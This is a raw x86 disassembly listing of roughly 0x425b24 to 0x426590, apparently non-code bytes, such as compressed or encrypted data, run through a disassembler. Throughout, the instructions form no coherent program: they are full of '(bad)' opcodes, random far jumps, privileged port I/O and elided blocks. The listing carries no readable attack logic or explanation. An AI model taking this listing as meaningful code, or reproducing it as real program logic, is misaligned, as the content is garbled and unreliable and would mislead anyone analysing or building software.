  425b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b25:	xor    eax,0x36d8e426
  425b2a:	in     eax,0x5
  425b2c:	mov    ah,0xcb
  425b2e:	jmp    DWORD PTR [eax]
  425b31:	mov    ds:0xa9fee5dd,eax
  425b36:	inc    DWORD PTR [eax]
  425b38:	outs   dx,DWORD PTR ds:[esi]
  425b39:	ret    
  425b3a:	retw   0x949d
  425b3e:	jbe    0x425b8d
  425b40:	scas   eax,DWORD PTR es:[edi]
  425b41:	jne    0x425b7d
  425b43:	(bad)  
  425b44:	mov    ds:0x8a803d7a,al
  425b49:	nop
  425b4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b4b:	pushf  
  425b4c:	dec    ebp
  425b4d:	push   es
  425b4e:	(bad)  
  425b4f:	pop    edx
  425b50:	push   es
  425b51:	(bad)  
  425b52:	popf   
  425b53:	out    0xa0,al
  425b55:	jmp    0x4e6c0781
  425b5a:	add    DWORD PTR [edx],esp
  425b5c:	xchg   edx,edx
  425b5e:	push   edi
  425b5f:	dec    edx
  425b60:	mov    ah,0xf2
  425b62:	mov    edx,0xe5720c9b
  425b67:	aad    0x7c
  425b69:	lods   al,BYTE PTR ds:[esi]
  425b6a:	mov    bh,ch
  425b6c:	mov    ebx,cs
  425b6e:	rcl    dl,cl
  425b70:	jmp    0xb5c5:0xb923a475
  425b77:	imul   ebp,DWORD PTR [ebx+0x35],0x2193fdc3
  425b7e:	mov    ds:0x8d7fa15d,eax
  425b83:	ror    DWORD PTR [ebp-0x46c2a151],1
  425b89:	and    BYTE PTR [eax+0x14b48a02],bl
  425b8f:	repz xor eax,0x0
	...
  425bf1:	add    BYTE PTR [eax],al
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	fs jne 0x425c68
  425c03:	call   0x43ef9a
  425c08:	add    eax,0xcf000001
  425c0d:	pop    ebp
  425c0e:	hlt    
  425c0f:	inc    ebx
  425c10:	inc    edx
  425c11:	mov    BYTE PTR [edx],dh
  425c13:	mov    esp,0xf1575008
  425c18:	adc    BYTE PTR [ebx+ebp*4-0x314c6cf1],al
  425c1f:	rol    DWORD PTR [esi-0x2],cl
  425c22:	dec    ebx
  425c23:	add    DWORD PTR ds:0xa8baf5bc,ebp
  425c29:	sub    al,0x6c
  425c2b:	push   cs
  425c2c:	clc    
  425c2d:	(bad)  
  425c2e:	stos   DWORD PTR es:[edi],eax
  425c2f:	jl     0x425bc7
  425c31:	cmc    
  425c32:	sti    
  425c33:	out    0xe5,al
  425c35:	lock adc bh,dl
  425c38:	jmp    0x4fcf7699
  425c3d:	pusha  
  425c3e:	je     0x425c64
  425c40:	mov    cl,0x41
  425c42:	or     BYTE PTR [edi+ebx*4+0x5f],ah
  425c46:	jmp    DWORD PTR [ebx-0x7f]
  425c49:	mov    ds,ecx
  425c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c4c:	jnp    0x425c56
  425c4e:	pop    es
  425c4f:	adc    BYTE PTR [edx+0xf9fb596],ch
  425c55:	mov    bl,0x77
  425c57:	jo     0x425c9a
  425c59:	adc    edx,0x216938da
  425c5f:	mov    cl,0x12
  425c61:	lahf   
  425c62:	sub    ecx,DWORD PTR [ebx+0x76e9600e]
  425c68:	cs in  al,0x1e
  425c6b:	pop    ebp
  425c6c:	cmp    BYTE PTR ds:0x994120c8,0xc5
  425c73:	jb     0x425cb4
  425c75:	add    al,0xcf
  425c77:	mov    cs,WORD PTR [esp+eax*1]
  425c7a:	loop   0x425c07
  425c7c:	test   al,0x17
  425c7e:	sub    ebx,DWORD PTR [ebx+0x4c2d8670]
  425c84:	mov    ecx,0xa3744e1d
  425c89:	nop
  425c8a:	jno    0x425c87
  425c8c:	mov    gs,WORD PTR [edx+0xcf13134]
  425c92:	unpckhps xmm5,xmm7
  425c95:	or     BYTE PTR [eax+0x67],ch
  425c98:	sub    bh,al
  425c9a:	pushf  
  425c9b:	mov    eax,0x8889b464
  425ca0:	jmp    DWORD PTR es:[ebp+edx*1-0x61003490]
  425ca8:	push   ds
  425ca9:	les    ecx,FWORD PTR cs:[esi+ecx*4-0x4f1a7e5d]
  425cb1:	sbb    DWORD PTR [edx+eax*4],ebx
  425cb4:	xchg   esi,eax
  425cb5:	push   edi
  425cb6:	add    eax,0x7f3435a8
  425cbb:	(bad)  
  425cbc:	jb     0x425cc0
  425cbe:	pop    ss
  425cbf:	lods   eax,DWORD PTR ds:[esi]
  425cc0:	in     eax,dx
  425cc1:	ret    
  425cc2:	(bad)  
  425cc3:	mov    edx,0x41f64b49
  425cc8:	xchg   esp,eax
  425cc9:	int    0x8e
  425ccb:	daa    
  425ccc:	je     0x425d18
  425cce:	fdivr  DWORD PTR [eax]
  425cd0:	jg     0x425cf1
  425cd2:	outs   dx,BYTE PTR ds:[esi]
  425cd3:	xchg   esi,eax
  425cd4:	dec    esp
  425cd5:	(bad)  [eax-0x54b39ac0]
  425cdb:	mov    ebp,0x8c6caec5
  425ce0:	mov    dh,0xa8
  425ce2:	outs   dx,BYTE PTR ds:[esi]
  425ce3:	xor    dl,0xc1
  425ce6:	rcl    BYTE PTR [eax-0x66],1
  425ce9:	or     al,0x68
  425ceb:	and    BYTE PTR [eax+eiz*4+0x10],bh
  425cef:	mov    ds:0x1576de0,al
  425cf4:	imul   BYTE PTR [edi]
  425cf6:	and    DWORD PTR [edx],ecx
  425cf8:	pop    eax
  425cf9:	cmp    eax,0xf9194a
  425cfe:	jle    0x425c90
  425d00:	jo     0x425cda
  425d02:	and    ebx,edx
  425d04:	test   BYTE PTR [ecx],0x17
  425d07:	mov    ch,0xa6
  425d09:	pushf  
  425d0a:	inc    esi
  425d0b:	jle    0x425d2e
  425d0d:	js     0x425cc6
  425d0f:	mov    bh,0x34
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xf61e677d,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0xdd000001
  425d8d:	mov    fs,WORD PTR [ecx-0x74]
  425d90:	inc    ebp
  425d91:	dec    edi
  425d92:	xor    ebp,DWORD PTR [esi-0x58770958]
  425d98:	mov    esi,0x6cbe46d9
  425d9d:	int    0x3e
  425d9f:	sub    ebp,DWORD PTR [eax+0x31321b5f]
  425da5:	xchg   DWORD PTR [edx+eiz*1],esp
  425da8:	sar    ebx,0x55
  425dab:	cmp    BYTE PTR [ebp+0xe],dl
  425dae:	pop    ecx
  425daf:	mov    WORD PTR [ecx+0x2e],fs
  425db2:	pop    edi
  425db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425db4:	sub    eax,0x3e2ed0d2
  425db9:	out    0xc9,al
  425dbb:	icebp  
  425dbc:	inc    esp
  425dbd:	adc    eax,0x22ec366a
  425dc2:	arpl   ax,dx
  425dc4:	and    BYTE PTR [ebp+0x52],0xef
  425dc8:	mov    dh,0xdf
  425dca:	add    BYTE PTR [ebx-0x11],bh
  425dcd:	adc    BYTE PTR [esi-0x55],bl
  425dd0:	xchg   dl,bh
  425dd2:	scas   eax,DWORD PTR es:[edi]
  425dd3:	add    eax,0xb3827b9d
  425dd8:	rcl    DWORD PTR [ebp-0x17],1
  425ddb:	popf   
  425ddc:	gs pop eax
  425dde:	das    
  425ddf:	(bad)  
  425de0:	ins    BYTE PTR es:[edi],dx
  425de1:	ss sub ecx,eax
  425de4:	dec    ebp
  425de5:	cmp    al,0xc3
  425de7:	xchg   BYTE PTR [ecx],cl
  425de9:	mov    dh,BYTE PTR [esi+ecx*2+0x164d4881]
  425df0:	fwait
  425df1:	lock hlt 
  425df3:	add    BYTE PTR [ebp-0x2d],bl
  425df6:	xchg   esi,eax
  425df7:	int    0xd1
  425df9:	aas    
  425dfa:	pop    ebx
  425dfb:	loopne 0x425e3f
  425dfd:	xchg   ecx,eax
  425dfe:	(bad)  
  425dff:	rcl    ebx,cl
  425e01:	imul   esp,DWORD PTR [esi-0x2],0x2ba7cd84
  425e08:	mov    ebp,0x9e9c812d
  425e0d:	xor    al,0xf1
  425e0f:	adc    DWORD PTR [eax+0x48377c12],edx
  425e15:	call   0x8ec:0xa45f501f
  425e1c:	sahf   
  425e1d:	(bad)  
  425e1e:	jl     0x425e3d
  425e20:	mov    DWORD PTR [ecx],esp
  425e22:	jmp    0xe413:0x4d375273
  425e29:	cmp    eax,0x2f1fed9b
  425e2e:	int    0xe4
  425e30:	sub    BYTE PTR [edx+0x3b93417b],dh
  425e36:	jnp    0x425e6c
  425e38:	mov    ds:0x39350e77,al
  425e3d:	iret   
  425e3e:	push   edi
  425e3f:	imul   esp,DWORD PTR [edx],0xffffff8f
  425e42:	out    0x5c,al
  425e44:	call   0xe6c78349
  425e49:	es pusha 
  425e4b:	aad    0x13
  425e4d:	xchg   ebx,eax
  425e4e:	xchg   BYTE PTR [ecx+0x71ff3a95],bl
  425e54:	fist   WORD PTR [edi-0x51]
  425e57:	jb     0x425e02
  425e59:	imul   eax,DWORD PTR [edx],0x9b947a62
  425e5f:	dec    edx
  425e60:	xchg   BYTE PTR [edi+0xd847edf],dh
  425e66:	xchg   ecx,eax
  425e67:	addr16 ja 0x425eae
  425e6a:	or     al,dh
  425e6c:	repnz sbb DWORD PTR [esi+0x64],edx
  425e70:	mov    dl,0x13
  425e72:	fsubp  st(0),st
  425e74:	mov    al,0xd2
  425e76:	jge    0x425eab
  425e78:	jp     0x425e65
  425e7a:	ret    
  425e7b:	test   eax,0xbfb22965
  425e80:	push   es
  425e81:	jae    0x425e09
  425e83:	sub    eax,0x8a903c81
  425e88:	lock sub BYTE PTR ds:0xb8326aa7,ch
  425e8f:	sbb    eax,0xcb
	...
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	xchg   edx,eax
  425f01:	mov    eax,0x959c27e9
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    eax,0xe6000001
  425f0d:	xchg   esi,eax
  425f0e:	sub    BYTE PTR [ecx+0x41],ch
  425f11:	jl     0x425edb
  425f13:	mov    esp,DWORD PTR [ebp+esi*8-0x30]
  425f17:	inc    ecx
  425f18:	adc    BYTE PTR [eax+edx*4-0x36102bfa],bh
  425f1f:	dec    cx
  425f21:	repnz cmp BYTE PTR [edi-0x2f604f0],0xf3
  425f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f2a:	fnstenv [ebx+edx*8-0x6]
  425f2e:	call   0xf399:0xd09318fb
  425f35:	inc    ebp
  425f36:	pop    ss
  425f37:	cmp    al,0x25
  425f39:	adc    ebp,DWORD PTR [ecx+0x79]
  425f3c:	popf   
  425f3d:	lds    ebp,FWORD PTR [edi+0x68]
  425f40:	les    esp,FWORD PTR [edx-0x55]
  425f43:	xor    al,0x3e
  425f45:	scas   eax,DWORD PTR es:[edi]
  425f46:	enter  0x2672,0x2b
  425f4a:	jo     0x425f4c
  425f4c:	not    BYTE PTR [eax-0x662a8a89]
  425f52:	mov    ebx,0xc286f872
  425f57:	je     0x425eea
  425f59:	ret    0xebfc
  425f5c:	(bad)  
  425f5d:	and    DWORD PTR [eax-0x463cddce],ebx
  425f63:	pop    es
  425f64:	mov    cl,0x1c
  425f66:	(bad)  
  425f67:	dec    ebp
  425f68:	mov    ds:0x11174ad7,al
  425f6d:	or     BYTE PTR [ebp+0x29],dl
  425f70:	mov    ebp,0x88007de1
  425f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f76:	fnstenv [ebp-0x167db419]
  425f7c:	inc    esp
  425f7d:	pop    es
  425f7e:	les    esi,FWORD PTR [esi+eiz*2]
  425f81:	test   eax,0xa24d9d95
  425f86:	cli    
  425f87:	pop    es
  425f88:	xor    DWORD PTR [edi-0x5],ebp
  425f8b:	push   edx
  425f8c:	pushf  
  425f8d:	xchg   esi,eax
  425f8e:	jno    0x42600c
  425f90:	das    
  425f91:	dec    eax
  425f92:	hlt    
  425f93:	jl     0x425fd1
  425f95:	and    eax,0x182ae34c
  425f9a:	adc    ebp,DWORD PTR [ebp+0x5]
  425f9d:	and    BYTE PTR [esi+eax*2+0x6d],0x26
  425fa2:	mov    al,ds:0x8ff99bfe
  425fa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fa8:	fst    DWORD PTR [ebp+0x61b1390e]
  425fae:	pop    ss
  425faf:	sahf   
  425fb0:	loope  0x425fcb
  425fb2:	in     al,dx
  425fb3:	push   edi
  425fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425fb5:	sahf   
  425fb6:	xchg   ecx,eax
  425fb7:	mov    ds:0xf4442ea9,al
  425fbc:	dec    ecx
  425fbd:	inc    ebx
  425fbe:	data16 loop 0x42601c
  425fc1:	pop    esp
  425fc2:	int    0x31
  425fc4:	mov    eax,0x5ce6cd78
  425fc9:	out    0x76,eax
  425fcb:	(bad)  
  425fcc:	icebp  
  425fcd:	lea    ebx,[ecx+esi*4+0x605cd484]
  425fd4:	push   0xcb658751
  425fd9:	(bad)  [edx]
  425fdb:	push   eax
  425fdc:	(bad)  
  425fdd:	xchg   edi,eax
  425fde:	ss cmp edi,0xa5b1cda8
  425fe5:	test   DWORD PTR [edi-0x68ba95fd],edi
  425feb:	loopne 0x42603e
  425fed:	iret   
  425fee:	loop   0x425ff8
  425ff0:	mov    al,ds:0x46796ba3
  425ff5:	test   BYTE PTR [esi-0x20],bl
  425ff8:	aam    0x29
  425ffa:	jbe    0x425f99
  425ffc:	js     0x425ff0
  425ffe:	(bad)  
  425fff:	pop    esi
  426000:	sar    DWORD PTR [ebp-0x7add8c4c],1
  426006:	pop    esp
  426007:	idiv   BYTE PTR [ecx+0x5f47a3af]
  42600d:	lods   al,BYTE PTR ds:[esi]
  42600e:	dec    esi
  42600f:	and    eax,DWORD PTR [edx+0x0]
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	xor    DWORD PTR [ecx-0x2c],0x196a1a6
  426087:	add    BYTE PTR ds:0x95000001,al
  42608d:	xchg   edi,eax
  42608e:	mov    ch,0x33
  426090:	inc    edx
  426091:	inc    eax
  426092:	frstor [esp+edi*2]
  426095:	retf   
  426096:	js     0x4260d5
  426098:	call   0xc884:0xae749464
  42609f:	inc    ebx
  4260a0:	sub    edx,ecx
  4260a2:	sbb    esp,edx
  4260a4:	arpl   bp,di
  4260a6:	xchg   esi,eax
  4260a7:	jmp    0xe737:0x854647a8
  4260ae:	and    edx,DWORD PTR ds:0x5a36dc99
  4260b4:	js     0x42604c
  4260b6:	xchg   esi,eax
  4260b7:	retf   
  4260b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260b9:	add    eax,0x5dc93c7e
  4260be:	push   cs
  4260bf:	mov    dl,0xc2
  4260c1:	jbe    0x42612e
  4260c3:	xchg   ebp,eax
  4260c4:	dec    ebx
  4260c5:	je     0x426107
  4260c7:	and    edi,ecx
  4260c9:	add    ebx,DWORD PTR [edi-0x9b4302f]
  4260cf:	rcr    ch,cl
  4260d1:	pop    edx
  4260d2:	gs test dl,cl
  4260d5:	call   FWORD PTR [ebx+0x43f29ed2]
  4260db:	cmc    
  4260dc:	push   0x51
  4260de:	aaa    
  4260df:	push   eax
  4260e0:	fsubr  st,st(2)
  4260e2:	jo     0x426089
  4260e4:	xor    eax,esp
  4260e6:	pop    edi
  4260e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260e8:	and    eax,0xb1e10119
  4260ed:	loope  0x42613a
  4260ef:	(bad)  
  4260f1:	or     eax,0xf5b44771
  4260f6:	push   ebx
  4260f7:	enter  0x6e2b,0x6e
  4260fb:	jbe    0x426114
  4260fd:	jbe    0x42616e
  4260ff:	sbb    al,0xd4
  426101:	jl     0x426146
  426103:	inc    ecx
  426104:	nop
  426105:	mov    al,ds:0xd06e6d7d
  42610a:	jmp    0x4260d9
  42610c:	or     BYTE PTR [eax-0x55],cl
  42610f:	inc    ecx
  426110:	jae    0x426138
  426112:	in     al,dx
  426113:	and    edx,DWORD PTR [ecx-0x7398294a]
  426119:	dec    ecx
  42611a:	mov    dh,0xe9
  42611c:	sub    BYTE PTR gs:[esi+0x5be028c9],bh
  426123:	mov    eax,0xffaa434
  426128:	jge    0x42617b
  42612a:	xor    eax,0xe5d6f44b
  42612f:	jl     0x426126
  426131:	add    al,0x76
  426133:	pusha  
  426134:	cdq    
  426135:	pop    ecx
  426136:	mov    eax,ds:0x4bc8152d
  42613b:	inc    ecx
  42613c:	push   esi
  42613d:	lods   eax,DWORD PTR ds:[esi]
  42613e:	adc    DWORD PTR [edx],ebp
  426140:	cli    
  426141:	add    edi,DWORD PTR [edx]
  426143:	paddd  mm0,QWORD PTR [esi]
  426146:	pushf  
  426147:	sar    BYTE PTR [edx+0x72],1
  42614a:	push   esp
  42614b:	dec    ecx
  42614c:	scas   eax,DWORD PTR es:[edi]
  42614d:	in     eax,dx
  42614e:	in     al,0x35
  426150:	inc    ebx
  426151:	pop    ds
  426152:	dec    ebp
  426153:	repnz stos BYTE PTR es:[edi],al
  426155:	daa    
  426156:	leave  
  426157:	ficomp WORD PTR [ebx-0x4e969636]
  42615d:	aaa    
  42615e:	add    esi,ebp
  426160:	rol    BYTE PTR [esi],cl
  426162:	popf   
  426163:	and    BYTE PTR [ebp+0x32],dh
  426166:	(bad)  [ebx-0x54]
  426169:	jg     0x4261be
  42616b:	test   BYTE PTR [ecx-0x1a],0x43
  42616f:	lahf   
  426170:	jno    0x4260f8
  426172:	lds    esp,FWORD PTR [ebx+0x15]
  426175:	inc    ebp
  426176:	xchg   ebx,eax
  426177:	leave  
  426178:	inc    edx
  426179:	jle    0x426160
  42617b:	fidiv  WORD PTR [ebx]
  42617d:	mov    ch,0xae
  42617f:	jmp    0xdb93:0x3bc79967
  426186:	shl    BYTE PTR [eax+0x61],cl
  426189:	mov    ecx,esi
  42618b:	push   ds
  42618c:	push   ebx
  42618d:	xor    DWORD PTR [esi],esi
  42618f:	sub    ebx,DWORD PTR [edx+0x0]
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	sub    ebp,ebp
  426202:	and    BYTE PTR [ecx-0x5a],bl
  426205:	xchg   edi,eax
  426206:	add    DWORD PTR [eax],eax
  426208:	add    eax,0xef000001
  42620d:	cwde   
  42620e:	scas   eax,DWORD PTR es:[edi]
  42620f:	jg     0x426212
  426211:	jmp    0xce220893
  426216:	mov    fs,WORD PTR [edi+0x6]
  426219:	dec    esi
  42621a:	outs   dx,BYTE PTR ds:[esi]
  42621b:	and    esi,DWORD PTR [esp+ebp*4+0x72]
  42621f:	clc    
  426220:	add    al,0x4b
  426222:	mov    bl,0x94
  426224:	dec    edi
  426225:	fcmovnbe st,st(1)
  426227:	(bad)  
  426228:	test   cl,0x3b
  42622b:	addr16 aam 0x6b
  42622e:	sbb    eax,esp
  426230:	xchg   edx,eax
  426231:	sub    BYTE PTR [edx],ch
  426233:	movntps XMMWORD PTR [ebx],xmm0
  426236:	xlat   BYTE PTR ds:[ebx]
  426237:	mov    WORD PTR [ebp+0x67d300e0],gs
  42623d:	cs sbb al,0x10
  426240:	ins    DWORD PTR es:[edi],dx
  426241:	ret    
  426242:	push   ecx
  426243:	outs   dx,BYTE PTR ds:[esi]
  426244:	retf   0xaa3
  426247:	inc    eax
  426248:	sub    DWORD PTR [esp+ebp*8],0xf01dacdd
  42624f:	push   es
  426250:	xor    DWORD PTR [edx+0xa637127],esp
  426256:	retf   
  426257:	dec    ecx
  426258:	push   es
  426259:	add    al,0xe0
  42625b:	out    dx,al
  42625c:	adc    dh,BYTE PTR [esi]
  42625e:	fist   WORD PTR [ecx+esi*4]
  426261:	scas   al,BYTE PTR es:[edi]
  426262:	xchg   ebx,eax
  426263:	cli    
  426264:	outs   dx,BYTE PTR ds:[esi]
  426265:	mov    eax,ds:0xfbac5b4c
  42626a:	xchg   ebx,eax
  42626b:	mov    ebp,esp
  42626d:	pop    edx
  42626e:	jge    0x4262df
  426270:	(bad)  
  426271:	mov    ds:0x2ef3d0c6,al
  426276:	mov    bl,0xa7
  426278:	pop    edi
  426279:	test   BYTE PTR [edi+ebp*4-0x75],bh
  42627d:	add    bh,dh
  42627f:	stc    
  426280:	sub    ecx,DWORD PTR [edx]
  426282:	rol    dl,cl
  426284:	data16 adc BYTE PTR [edx+0x3],cl
  426288:	lahf   
  426289:	xchg   esi,eax
  42628a:	add    DWORD PTR [ebp+0x49d1875d],0x289f5459
  426294:	mov    eax,ds:0xf980b3e4
  426299:	push   eax
  42629a:	int    0x0
  42629c:	iret   
  42629d:	push   esi
  42629e:	call   0xd325:0x4c25bf6
  4262a5:	frstor [ebp+0x5c29ea8a]
  4262ab:	loope  0x426325
  4262ad:	cmp    DWORD PTR [eax-0x53],edx
  4262b0:	arpl   ax,sp
  4262b2:	adc    BYTE PTR ds:0x941c91af,al
  4262b8:	adc    DWORD PTR [edi+esi*1],edi
  4262bb:	arpl   WORD PTR [esi-0x4b9e13ad],bp
  4262c1:	xchg   ebx,eax
  4262c2:	aaa    
  4262c3:	fmul   DWORD PTR [ebx+0x1f9ff6b4]
  4262c9:	das    
  4262ca:	cmp    bh,al
  4262cc:	pop    ds
  4262cd:	jnp    0x426268
  4262cf:	push   edi
  4262d0:	fcomip st,st(2)
  4262d2:	sbb    al,0x90
  4262d4:	dec    esp
  4262d5:	or     DWORD PTR [ecx-0xf33f4b1],esp
  4262db:	cmc    
  4262dc:	out    dx,al
  4262dd:	cmp    BYTE PTR [ecx-0x2a195757],dl
  4262e3:	mov    ds:0x2140f963,eax
  4262e8:	adc    al,0x47
  4262ea:	mov    ?,WORD PTR [eax+0x78]
  4262ed:	jle    0x42636d
  4262ef:	call   0x9e8aac2
  4262f4:	shr    ah,1
  4262f6:	sub    al,0x55
  4262f8:	mov    bl,0x54
  4262fa:	retf   0x232a
  4262fd:	push   ebx
  4262fe:	xor    esp,edx
  426300:	fs inc dx
  426303:	and    eax,0x8d52f66a
  426308:	mov    bl,0xd9
  42630a:	xor    al,0x65
  42630c:	outs   dx,BYTE PTR ds:[esi]
  42630d:	xchg   edi,eax
  42630e:	inc    esi
  42630f:	mov    ah,0x62
	...
  426371:	add    BYTE PTR [eax],al
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  426377:	dec    esi
  426378:	std    
  426379:	out    dx,al
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x8c341f72
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0xa7000001
  42638d:	sbb    dl,0x76
  426390:	idiv   BYTE PTR [edx]
  426392:	mov    edi,0x562cdc57
  426397:	push   eax
  426398:	sar    BYTE PTR [esi-0x33],1
  42639b:	dec    ebp
  42639c:	jmp    0x5128:0xb323d21a
  4263a3:	adc    bp,ax
  4263a6:	out    0x58,eax
  4263a8:	ins    BYTE PTR es:[edi],dx
  4263a9:	fadd   QWORD PTR [esi+0x6e]
  4263ac:	popa   
  4263ad:	ffreep st(4)
  4263af:	gs push esp
  4263b1:	jecxz  0x4263ad
  4263b3:	cmp    dl,dl
  4263b5:	loop   0x42641e
  4263b7:	push   si
  4263b9:	xor    al,0x36
  4263bb:	push   0x416ec3dc
  4263c0:	add    DWORD PTR [esi+esi*8],esp
  4263c3:	xor    BYTE PTR [eax+0x22c241a4],al
  4263c9:	push   es
  4263ca:	mov    eax,0x403f61af
  4263cf:	ror    BYTE PTR [ecx-0x151dca93],0x5f
  4263d6:	mov    dl,0xc7
  4263d8:	add    DWORD PTR [ecx+0x47],ecx
  4263db:	stos   DWORD PTR es:[edi],eax
  4263dc:	xchg   ecx,eax
  4263dd:	mov    bl,0x78
  4263df:	mov    al,ds:0x4227f169
  4263e4:	mov    eax,ds:0xf9604fe3
  4263e9:	xor    al,0x1b
  4263eb:	jle    0x426438
  4263ed:	into   
  4263ee:	mov    esp,0xfa80bba5
  4263f3:	fwait
  4263f4:	mov    ah,0x33
  4263f6:	test   al,0x9b
  4263f8:	add    ebp,ecx
  4263fa:	je     0x426417
  4263fc:	lods   al,BYTE PTR ds:[esi]
  4263fd:	cmp    bl,BYTE PTR ds:0x109336ab
  426403:	xchg   edx,eax
  426404:	jnp    0x426474
  426406:	fs shl dh,0x55
  42640a:	int    0x6a
  42640c:	out    0xe2,al
  42640e:	in     eax,0x16
  426410:	imul   ecx,DWORD PTR [edx+0x782d864c],0xffffffcb
  426417:	push   ds
  426418:	das    
  426419:	cpuid  
  42641b:	mov    ebp,0x28ba3019
  426420:	dec    ecx
  426421:	out    dx,al
  426422:	loope  0x426467
  426424:	pushf  
  426425:	adc    DWORD PTR [edx],edx
  426427:	cmp    ch,BYTE PTR [eax+0x1854f36f]
  42642d:	lahf   
  42642e:	test   ebx,eax
  426430:	inc    eax
  426431:	ror    ebx,cl
  426433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426434:	dec    esi
  426435:	cli    
  426436:	pop    edi
  426437:	inc    ebp
  426438:	adc    cl,cl
  42643a:	sbb    DWORD PTR [esi-0x20],0xffffffc0
  42643e:	int    0x5c
  426440:	gs call 0xb43a91b
  426446:	dec    eax
  426447:	aas    
  426448:	sahf   
  426449:	mov    ebx,0x46f54001
  42644e:	clc    
  42644f:	fild   WORD PTR [esi+0x27]
  426452:	imul   ecx,DWORD PTR [edx],0x6db13f37
  426458:	add    BYTE PTR [edx-0x7e],al
  42645b:	mov    ebp,0x61b78bf0
  426460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426461:	pop    ecx
  426462:	fucom  st(2)
  426464:	jne    0x42640a
  426466:	mov    dh,0x92
  426468:	jmp    FWORD PTR [edx+0x52fd4e93]
  42646e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42646f:	out    0x60,al
  426471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426472:	pop    ecx
  426473:	inc    esp
  426474:	int3   
  426475:	hlt    
  426476:	jno    0x4264a0
  426478:	aas    
  426479:	add    cl,bl
  42647b:	retf   0x1e94
  42647e:	shr    BYTE PTR [esi],1
  426480:	sbb    edi,DWORD PTR ds:0xe7e7775d
  426486:	jno    0x42640d
  426488:	cmp    esi,DWORD PTR [edx+0x225ec3b7]
  42648e:	test   DWORD PTR [ecx+0x34],eax
	...
  4264f1:	add    BYTE PTR [eax],al
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   DWORD PTR [esi-0x4fcd924c],edx
  426505:	cdq    
  426506:	add    DWORD PTR [eax],eax
  426508:	add    eax,0x7e000001
  42650d:	das    
  42650e:	retf   0x13c7
  426511:	inc    esi
  426512:	sets   BYTE PTR [ebx+eiz*2+0x18]
  426517:	repz xor BYTE PTR [edi],dh
  42651a:	scas   al,BYTE PTR es:[edi]
  42651b:	clc    
  42651c:	dec    ebp
  42651d:	cmp    esp,DWORD PTR [edi]
  42651f:	sub    BYTE PTR [eax+0x67],cl
  426522:	stos   DWORD PTR es:[edi],eax
  426523:	cwde   
  426524:	out    dx,eax
  426525:	push   edi
  426526:	call   0x3d34:0x8388f640
  42652d:	sbb    eax,DWORD PTR [edx-0x5f]
  426530:	cmp    al,0x45
  426532:	sbb    cl,BYTE PTR [edi-0x43]
  426535:	jmp    0xcdfe9e60
  42653a:	sahf   
  42653b:	dec    esp
  42653c:	sub    DWORD PTR ds:0x6eb47016,ebp
  426542:	rcl    bl,0x9f
  426545:	neg    BYTE PTR [esi]
  426547:	fisttp DWORD PTR [eax+0x73]
  42654a:	cmp    BYTE PTR [ecx+0x14],0x5f
  42654e:	mov    ah,0x73
  426550:	(bad)  
  426551:	or     esi,DWORD PTR [edx-0x5e14dcf1]
  426557:	or     esp,DWORD PTR [eax]
  426559:	not    DWORD PTR [eax+0x32e1d503]
  42655f:	pop    ds
  426560:	scas   eax,DWORD PTR es:[edi]
  426561:	aam    0xca
  426563:	mov    edi,0xf49e09ef
  426568:	sub    DWORD PTR [ecx+edx*8+0x59],edx
  42656c:	jo     0x426545
  42656e:	hlt    
  42656f:	ret    
  426570:	mov    ebp,0x42ed48c7
  426575:	xor    al,BYTE PTR [ebp+0x1e]
  426578:	jnp    0x4265b6
  42657a:	xor    DWORD PTR [edx+0x22f1aea9],ebp
  426580:	shl    DWORD PTR [esi-0x57],1
  426583:	sbb    eax,0x4d274b1e
  426588:	add    eax,0x80cd224b
  42658d:	jae    0x426576
  42658f:	dec    edi
  426590:	icebp  
